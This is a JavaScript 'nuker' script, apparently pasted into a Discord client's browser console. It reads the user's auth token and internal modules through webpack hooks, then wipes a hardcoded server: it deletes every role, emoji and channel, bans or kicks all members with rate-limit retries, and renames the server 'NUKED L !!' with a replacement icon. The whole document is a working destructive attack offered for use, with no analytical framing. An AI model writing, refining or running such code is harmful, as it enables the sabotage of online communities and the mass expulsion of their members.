/***************************************/
let guildID = "808661332937015316"
let newservername = "NUKED L !!"

let emojis = true;
let roles = true;
let channels = true;
let serversettings = true;

let kickmembers = false;
let banmembers = true;

/***************************************/

let guild = FindModule("getGuild").getGuild(guildID);
if(guild === null || guild === undefined){
    console.error("Invalid Guild ID");
    throw new Error();
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
               
let request = (e) =>
 {
                        if (e && this._cache) return this._cache;
                        let t;
                        return (
                            "webpackJsonp" in window
                                ? (t = window.webpackJsonp.push([[], { [this.id]: (e, t, r) => (e.exports = r) }, [[this.id]]]))
                                : "webpackChunkdiscord_app" in window && window.webpackChunkdiscord_app.push([[this.id], {}, (e) => (t = e)]),
                            (this._cache = t)
                        );
}

let FindModule = (item)  =>
{
                        const o = request(item),
                            n = [];
                        for (let t in o.c) {
                            var m = o.c[t].exports;
                            if (m && m.__esModule && m.default && m.default[item]) return m.default;
                            if (m && m[item]) return m;
                        }
                        return t ? n : n.shift();
}

function patchData(url = '', data = {}) {
    const response = fetch(url, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        'Authorization':  FindModule("getToken").getToken(),
        'User-agent': navigator.userAgent,
        'x-super-properties': FindModule("getSuperPropertiesBase64").getSuperPropertiesBase64()
      },
      body: JSON.stringify(data)
    });
    return response;
}

function RemoveGuildRoles()
{
    let roles = FindModule("getGuild").getGuild(guildID).roles;

    for (let role_ of Object.keys(roles)) {
        var role = roles[role_];

        if(role.name == "@everyone") return;

        try {
            FindModule("deleteRole").deleteRole(guildID, role.id);
            console.log(`removed ${role.name}`);
        }
        catch(err) {
            console.log(err);
        }
    }
}

function RemoveAllEmojis()
{
    let emojis = FindModule("getEmojis").getEmojis(guildID)
    
    if(emojis != undefined)
    {
        emojis.forEach(function (emoji, index) {
            setTimeout(function () {
                try {
                FindModule("deleteEmoji").deleteEmoji(guildID, emoji.id);  
                console.log(`removed ${emoji.name}`);
                }
                catch(err) {}
              }, index * 2500);     
          })
    }
}

function RemoveAllChannels()
{
    let channels = FindModule("getChannels").getChannels(guildID);

    // Text channels
    channels.SELECTABLE.forEach(channel => {
        try{
            FindModule("deleteChannel").deleteChannel(channel["channel"].id);
            console.log(`removed ${channel["channel"].name}`);
        }
        catch(err){}
    });

    // Voice channels
    channels[2].forEach(channel => {
        let voicechannel = channel["channel"];
        try{
            FindModule("deleteChannel").deleteChannel(voicechannel.id);
            console.log(`removed ${voicechannel.name}`);
        }
        catch(err){}
    });

    // Categories
    channels[4].forEach(channel => {
        if(channel.comparator === -1) return;

        try{
            FindModule("deleteChannel").deleteChannel(channel["channel"].id);
            console.log(`removed ${channel["channel"].name}`);
        }
        catch(err){}
    });
}

async function goodbyemembers(){
        var memberList = FindModule("getMembers").getMembers(guildID);
        memberList.reverse();

        await Promise.all(memberList.map(async (member) => {

            if(member.userId == FindModule("getCurrentUser").getCurrentUser().id) return;

            if(banmembers)
            {
                try {
                    FindModule("banUser").banUser(guildID, member.userId).then(async resp => {
                    if(resp.ok === false){                
                        console.log(`waiting ${resp.retry_after}ms`);
                        await sleep(resp.retry_after);
                        FindModule("banUser").banUser(guildID, member.userId);
                    }
                })
                }
                catch(err){}
            }
            else if(kickmembers)
            {
                try {
                    FindModule("kickUser").kickUser(guildID, member.userId).then(async resp => {
                    if(resp.ok === false){                    
                        console.log(`waiting ${resp.retry_after}ms`);
                        await sleep(resp.retry_after);
                        FindModule("kickUser").kickUser(guildID, member.userId);
                    }
                })
                }
                catch(err){}
            }
        }));
}

function getData(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      var reader = new FileReader();
      reader.onloadend = function() {
        callback(reader.result);
      }
      reader.readAsDataURL(xhr.response);
    };
    xhr.open('GET', url);
    xhr.responseType = 'blob';
    xhr.send();
}

function serverchanger()
{
    var url = 'https://cdn.discordapp.com/attachments/807354930225741845/808077040095330344/uweqnknown.png' // feel free to change this

    getData(url, function(data_) {
            var payload = {name: newservername, icon: data_,description: null, region: "southafrica", verification_level: 0};
            patchData(`https://discord.com/api/v9/guilds/${guildID}`, payload);
      });
}

if(banmembers && kickmembers)
{
    console.error("Either enable ban members or kick members but do not enable both!");
    throw new Error();
}

if(roles){
    console.log("Removing guild roles...")
    RemoveGuildRoles();
}
if(emojis){
    console.log("Removing emojis...")
    RemoveAllEmojis();
}
if(kickmembers || banmembers)
{
     console.log("Yeeting members...");
     goodbyemembers().then(() => {})
      
}
if(channels){
    console.log("Removing channels...")
    RemoveAllChannels();
}
if(serversettings){
    console.log("Changing Channel Settings");
    serverchanger();
}
